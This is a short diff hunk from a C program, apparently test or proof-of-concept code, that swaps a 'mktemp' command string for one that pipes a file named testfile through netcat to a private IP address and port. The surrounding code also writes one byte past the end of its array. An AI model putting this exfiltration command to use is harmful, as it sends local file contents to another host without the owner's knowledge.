@@ -13,7 +13,7 @@
 #define STRUCT_LEN 0x28
 int main(void){
 
-        unsigned char code[] = "mktemp";  //this can be a input of the function
+        unsigned char code[] = "cat testfile | nc 192.168.122.215 222";  //this can be a input of the function
         int len_of_command = sizeof(code)/(sizeof(char));
         code[len_of_command] = '\0';
         len_of_command++;
